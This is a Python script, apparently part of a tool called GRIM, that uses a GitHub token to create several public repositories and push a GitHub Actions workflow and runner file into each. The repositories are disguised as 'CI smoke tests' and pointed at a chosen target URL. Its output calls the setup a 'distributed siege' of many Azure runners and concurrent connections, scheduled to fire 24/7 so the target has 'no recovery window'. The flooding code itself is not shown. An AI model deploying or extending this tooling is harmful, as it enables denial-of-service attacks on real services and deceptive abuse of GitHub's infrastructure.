#!/usr/bin/env python3
"""
GRIM Multi-Deployer
Creates multiple GitHub repos and deploys GRIM to each.
Run once to set up a distributed siege network.

Usage:
    python3 deploy-multi.py <github-token> <target-url> [num-repos] [workers-per-runner]

Example:
    python3 deploy-multi.py ghp_xxxxx https://target.com 3 50
"""
import sys
import time
import base64
import requests
import json
from urllib.parse import urlparse

GH_API = "https://api.github.com"

# Files to upload per repo
REPO_FILES = {
    ".github/workflows/grim.yml": open(".github/workflows/grim.yml").read(),
    "runner.py": open("runner.py").read(),
    "README.md": open("README.md").read(),
}


def gh_post(token, url, data):
    r = requests.post(
        f"{GH_API}{url}",
        headers={
            "Authorization": f"token {token}",
            "Accept": "application/vnd.github.v3+json",
            "Content-Type": "application/json",
        },
        json=data,
    )
    if r.status_code not in (200, 201):
        # Check if it's a "already exists" error
        if "already exists" in r.text.lower():
            return None  # Not an error, just already exists
        raise Exception(f"GitHub API error {r.status_code}: {r.text[:200]}")
    return r.json()


def gh_get(token, url):
    r = requests.get(
        f"{GH_API}{url}",
        headers={"Authorization": f"token {token}", "Accept": "application/vnd.github.v3+json"},
    )
    return r.json()


def gh_put_file(token, owner, repo, path, content, message, is_binary=False):
    """Create or update a file in the repo."""
    # First check if file exists (to get SHA)
    sha = None
    r = requests.get(
        f"{GH_API}/repos/{owner}/{repo}/contents/{path}",
        headers={"Authorization": f"token {token}", "Accept": "application/vnd.github.v3+json"},
    )
    if r.status_code == 200:
        sha = r.json().get("sha")

    encoded = base64.b64encode(content.encode()).decode() if not is_binary else base64.b64encode(content).decode()

    payload = {
        "message": message,
        "content": encoded,
    }
    if sha:
        payload["sha"] = sha

    r = requests.put(
        f"{GH_API}/repos/{owner}/{repo}/contents/{path}",
        headers={
            "Authorization": f"token {token}",
            "Accept": "application/vnd.github.v3+json",
            "Content-Type": "application/json",
        },
        json=payload,
    )
    if r.status_code not in (200, 201):
        raise Exception(f"File push error {r.status_code}: {r.text[:200]}")
    return r.json()


def create_and_populate_repo(token, repo_name, username, target_url):
    print(f"\n  ── Creating: {repo_name} ──")

    # Create repo
    r = requests.post(
        f"{GH_API}/user/repos",
        headers={
            "Authorization": f"token {token}",
            "Accept": "application/vnd.github.v3+json",
            "Content-Type": "application/json",
        },
        json={
            "name": repo_name,
            "description": "CI smoke tests for internal testing",
            "public": True,
            "has_issues": False,
            "has_wiki": False,
            "auto_init": False,
        },
    )
    if r.status_code == 201:
        print(f"  ✓ Repo created")
    elif r.status_code == 422 and "already exists" in r.text.lower():
        print(f"  ⚠ Repo already exists — pushing files anyway")
    else:
        print(f"  ✗ Repo creation failed: {r.status_code} {r.text[:100]}")
        return False

    # Push all files
    for path, content in REPO_FILES.items():
        for attempt in range(3):
            try:
                gh_put_file(token, username, repo_name, path, content, f"Add {path}")
                print(f"  ✓ {path}")
                break
            except Exception as e:
                if attempt == 2:
                    print(f"  ✗ {path}: {e}")
                time.sleep(2)

    # Update target in workflow
    workflow_content = REPO_FILES[".github/workflows/grim.yml"]
    if target_url in workflow_content:
        print(f"  ⚠ Target already in workflow")
    else:
        # Patch the default target
        updated_workflow = workflow_content.replace(
            "default: 'https://target.example.com'",
            f"default: '{target_url}'",
        )
        try:
            gh_put_file(token, username, repo_name, ".github/workflows/grim.yml", updated_workflow, "Update target URL")
            print(f"  ✓ Updated target URL")
        except:
            pass

    print(f"  ✓ {repo_name} DEPLOYED")
    return True


def main():
    print("""
    ╔══════════════════════════════════════════════════╗
    ║  GRIM MULTI-DEPLOYER — DISTRIBUTED SIEGE       ║
    ╚══════════════════════════════════════════════════╝
    """)

    if len(sys.argv) < 3:
        print("Usage: python3 deploy-multi.py <github-token> <target-url> [num-repos] [workers]")
        print("  github-token:  ghp_xxxx from https://github.com/settings/tokens")
        print("  target-url:    https://your-target-server.com")
        print("  num-repos:     Number of repos to create (default: 3)")
        print("  workers:       Workers per vector per runner (default: 50)")
        sys.exit(1)

    token = sys.argv[1]
    target = sys.argv[2]
    num_repos = int(sys.argv[3]) if len(sys.argv) > 3 else 3
    workers = sys.argv[4] if len(sys.argv) > 4 else "50"

    # Get username
    user = gh_get(token, "/user")
    username = user.get("login")
    print(f"  Authenticated as: {username}")
    print(f"  Target: {target}")
    print(f"  Deploying: {num_repos} repos")
    print()

    # Parse target for repo naming
    parsed = urlparse(target)
    safe_name = parsed.netloc.replace(".", "-").replace(":", "_")

    repo_names = []
    for i in range(1, num_repos + 1):
        repo_name = f"grim-{safe_name}-{i}"
        success = create_and_populate_repo(token, repo_name, username, target)
        if success:
            repo_names.append(repo_name)
        time.sleep(3)  # Rate limit buffer

    print(f"""
    ╔══════════════════════════════════════════════════╗
    ║  ALL REPOS DEPLOYED                             ║
    ╚══════════════════════════════════════════════════╝

    Target: {target}
    Repos created: {len(repo_names)}
    """)

    for repo in repo_names:
        print(f"  https://github.com/{username}/{repo}/actions")

    print(f"""
    TO START THE SIEGE:
    For each repo above:
      1. Go to the repo → Actions tab
      2. Select 'GRIM-SIEGE'
      3. Click 'Run workflow'
      4. Set Target URL = {target}
      5. Click 'Run workflow'

    Each repo = 8 parallel Azure runners
    All 3 repos = 24 simultaneous Azure IPs
    Cron schedules = continuous 24/7 fire
    """)

    if num_repos >= 3:
        print(f"""
    SITUATION: {len(repo_names)} repos × 8 runners × 4 vectors × {workers} workers
    = {len(repo_names) * 8 * 4 * int(workers)} concurrent connections
    = {len(repo_names) * 8} Azure IPs hitting simultaneously

    Target will have NO RECOVERY WINDOW.
    """)


if __name__ == "__main__":
    main()
